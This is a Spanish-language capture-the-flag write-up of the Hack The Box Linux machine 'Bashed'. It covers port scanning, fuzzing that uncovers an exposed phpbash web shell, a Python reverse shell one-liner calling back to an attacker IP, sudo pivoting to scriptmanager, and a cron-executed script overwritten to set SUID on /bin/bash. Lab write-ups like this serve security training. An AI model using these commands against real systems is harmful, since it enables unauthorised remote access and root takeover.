---
title: Bashed
published: true
categories: [Linux,Easy]
tags: [Web explotation, SUDO abuse, Cron abuse]

image:
  path: https://user-images.githubusercontent.com/55555187/183289085-011dd849-cc9e-4901-a059-2b7b9220f00c.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
 
---

Bashed es una <font color="#98E256">máquina Easy</font> de temática <font color="#D35400">Linux</font> en la que se explota un software libre de pentesting que tiene una web shell expuesta, se explotan las restricciones del archivo sudoers para impersonalizar a un usuario y se explota una tarea cron en la que root ejecuta un archivo sobre el que podemos escribir.

## Reconocimiento y explotación

```bash
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv -oG portScan 10.10.10.68
```

![image](https://user-images.githubusercontent.com/55555187/183284852-a55f08e0-154a-4ae6-a518-b97a97b49ab2.png)

```bash
nmap -sCV -p80 -oN portSV 10.10.10.68
```

![image](https://user-images.githubusercontent.com/55555187/183284890-c0bca4e0-5869-4757-9fb4-6d2171f8f922.png)

Viendo el nombre del sitio decido buscarlo en internet ya que tiene pinta de ser un proyecto de software libre. Logro encontrar su Github [phpbash: A semi-interactive PHP shell compressed into a single file.](https://github.com/Arrexel/phpbash) y me informo un poco de las funcionalidades que ofrece.

En la instalación por defecto los ficheros *phpbash.php* y *phpbash.min.dev* se encuentran en el directorio */uploads*, navego a ese directorio en la web y veo que no contiene nada.

Viendo esto decido lanzar un fuzzing para identificar más directorios y ver si han movido los archivos a otro lado:

```bash
wfuzz -c --hc=404 -t 200 -H "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:103.0) Gecko/20100101 Firefox/103.0" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ
```

<img src="https://user-images.githubusercontent.com/55555187/183285039-37bdca7b-3015-4b04-be81-62dce6886441.png" title="" alt="image" width="627">

En */dev* descubro los archivos que estaba buscando:

<img src="https://user-images.githubusercontent.com/55555187/183285321-b4121872-368a-4a06-9b00-0f3e075d542d.png" title="" alt="image" width="460">

El archivo *phpbash.php* ofrece una consola semi interactiva (ya que no estamos en una tty realmente)

<img src="https://user-images.githubusercontent.com/55555187/183285441-8ff7ae28-f808-4fc5-a25d-ea6752f51182.png" title="" alt="image" width="529">

## Escalada de privilegios

Lo primero que hago es comprobar si puedo ejecutar *sudo* en algún contexto y descubro que puede ejecutar sudo como el usuario *scriptmanager*. 

Antes de hacer nada, decido obtener una tty ya que desde la web no puedo:

1. Usar *netcat* con la opción -e

2. *Curl* y *wget* no tienen conectividad con el exterior por lo que no puedo bajarme ningún archivo de mi máquina

3. Por algún motivo tampoco es posible introducir contenido a ficheros usando la técnica *echo 'abc' > fichero*

4. Tampoco puedo ejecutar editores de texto 

Como la máquina tiene *Python* instalado, me entablo una *reverse shell* usandolo.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

En la raiz descubro el directorio */scripts* al que no puedo acceder mediante *cd* pero si puedo ver su contenido usando *ls -l /scripts*:

![image](https://user-images.githubusercontent.com/55555187/183287274-2d050f74-e8ae-4128-9965-3bcbc7eceb1b.png)

<img src="https://user-images.githubusercontent.com/55555187/183287323-174e42f9-fe95-480f-9774-0ef91cefb4ed.png" title="" alt="image" width="521">

Viendo que hay un script en *Python*, intuyo que se puede estar ejecutando una tarea *cron* que haga uso de él por lo que me bajo *pspy* a la máquina víctima y lo ejecuto:

<img src="https://user-images.githubusercontent.com/55555187/183287463-cf5165c8-3ba1-4775-a81b-111781f06cb0.png" title="" alt="image" width="620">

Veo que root está ejecutando todos los scripts en *python* que haya en el directorio */scripts* lo que supondría un vector de escalada si consiguiese ser *scriptmanager*.

Por suerte, *www-data* puede ejecutar cualquier comando como scriptmanager haciendo uso de sudo, spawneo una consola como el usuario *scriptmanager*:

```bash
sudo -u scriptmanager bash -i
```

![image](https://user-images.githubusercontent.com/55555187/183289203-b22893b0-366a-4007-b6e1-e596ccfa1b30.png)

Una vez como *scriptmanager*, sustituyo *test.py* por un script malicioso que dará permisos *SUID* a */bin/bash* permitiendo que se pueda obtener una consola como root usando la opción */bin/bash -p*:

```bash
echo 'import os; os.system("chmod 4755 /bin/bash")' > test.py
```

![image](https://user-images.githubusercontent.com/55555187/183288271-a8431037-d83e-41d8-acb8-00650e078f33.png)

![image](https://user-images.githubusercontent.com/55555187/183288307-fe33aec3-1e19-4b1c-a46e-47b4df804fdc.png)

![image](https://user-images.githubusercontent.com/55555187/183288363-54a19912-0d23-417a-a374-e5cfd8bb2f67.png)
